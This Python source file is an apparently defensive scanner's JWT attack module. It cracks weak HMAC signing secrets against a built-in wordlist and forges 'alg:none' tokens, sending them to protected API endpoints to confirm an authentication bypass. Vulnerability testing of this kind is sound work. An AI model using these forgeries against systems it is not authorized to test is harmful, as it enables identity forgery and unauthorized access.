import base64
import hashlib
import hmac
import json

import httpx

from backend.app.shasec.verifier import register
from backend.app.shasec.verifier._spec import fetch_spec, fill_path, get_endpoints, origin, requires_auth
from backend.app.shasec.verifier.base import ExploitContext, ExploitModule, ExploitResult
from backend.common.enums import FindingSeverity
from backend.common.log import log

# Small, fast wordlist of notoriously weak / default HS256 signing secrets.
_WEAK_SECRETS = [
    'secret', 'secretkey', 'secret_key', 'jwt_secret', 'jwtsecret', 'password',
    'changeme', 'admin', 'test', 'key', 'private', 'token', 'supersecret',
    'secret123', '12345678', 'your-256-bit-secret', 'your-secret-key',
    'mysecret', 'default', 'jwt', 'authsecret', 'qwerty', 'root', 'shasec',
]


def _b64d(s: str) -> bytes:
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode())


def _b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()


class JwtAttacksModule(ExploitModule):
    """JWT forgery: `alg:none` acceptance and weak HS256 secret recovery.

    Requires a sample token (provide it as ``auth_token`` on the scan). With a
    cracked secret or an accepted `alg:none` token, an attacker forges any
    identity — so this is critical when it lands.
    """

    name = 'jwt'
    category = 'jwt-forgery'
    handles = ('api', 'website', 'graphql')
    timeout = 60

    async def run(self, ctx: ExploitContext) -> list[ExploitResult]:
        token = ctx.auth_token
        if not token or token.count('.') != 2:
            return []  # no usable token supplied

        h_b64, p_b64, sig_b64 = token.split('.')
        try:
            header = json.loads(_b64d(h_b64))
            payload = json.loads(_b64d(p_b64))
        except (ValueError, json.JSONDecodeError):
            return []

        results: list[ExploitResult] = []

        # --- Offline: weak HS256 secret recovery (no requests, fully safe) ---
        alg = str(header.get('alg', '')).upper()
        if alg.startswith('HS'):
            signing_input = f'{h_b64}.{p_b64}'.encode()
            digest = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}.get(alg)
            for secret in _WEAK_SECRETS:
                if digest is None:
                    break
                expected = _b64e(hmac.new(secret.encode(), signing_input, digest).digest())
                if hmac.compare_digest(expected, sig_b64):
                    results.append(
                        ExploitResult(
                            category=self.category,
                            title=f'JWT signed with a weak secret ("{secret}")',
                            severity=FindingSeverity.critical.value,
                            confirmed=True,
                            impact='The signing secret is guessable — any token (any user/role) can be forged.',
                            request=f'(offline) HMAC-{alg} brute over {len(_WEAK_SECRETS)} candidates',
                            response=f'secret = "{secret}"',
                        )
                    )
                    break

        # --- Online: does the API accept alg:none? Needs a protected endpoint. ---
        async with httpx.AsyncClient(timeout=15, follow_redirects=True) as client:
            protected = await self._find_protected(client, ctx)
            if protected:
                forged = self._forge_alg_none(payload)
                try:
                    no_auth = await client.get(protected)
                    forged_resp = await client.get(protected, headers={'Authorization': f'Bearer {forged}'})
                except httpx.HTTPError:
                    no_auth = forged_resp = None
                if no_auth is not None and forged_resp is not None:
                    log.info(f'[exploit:jwt] scan {ctx.scan_id} alg:none {protected} -> {forged_resp.status_code} (no-auth {no_auth.status_code})')
                    if no_auth.status_code in (401, 403) and forged_resp.status_code == 200:
                        results.append(
                            ExploitResult(
                                category=self.category,
                                title='JWT alg:none accepted — signature not verified',
                                severity=FindingSeverity.critical.value,
                                confirmed=True,
                                impact='A token with "alg":"none" and no signature is accepted — full auth bypass / identity forgery.',
                                request=f'GET {protected}\nAuthorization: Bearer {forged[:60]}...',
                                response=f'no-token={no_auth.status_code}, forged-alg-none=200',
                            )
                        )
        return results

    @staticmethod
    def _forge_alg_none(payload: dict) -> str:
        header = {'alg': 'none', 'typ': 'JWT'}
        return f'{_b64e(json.dumps(header).encode())}.{_b64e(json.dumps(payload).encode())}.'

    @staticmethod
    async def _find_protected(client: httpx.AsyncClient, ctx: ExploitContext) -> str | None:
        if ctx.options.get('protected_path'):
            return f'{origin(ctx.target_url)}{ctx.options["protected_path"]}'
        spec = await fetch_spec(client, origin(ctx.target_url))
        if not spec:
            return None
        global_security = bool(spec.get('security'))
        for path, _method, op in get_endpoints(spec):
            if requires_auth(op, global_security):
                return f'{origin(ctx.target_url)}{fill_path(path)}'
        return None


register(JwtAttacksModule())
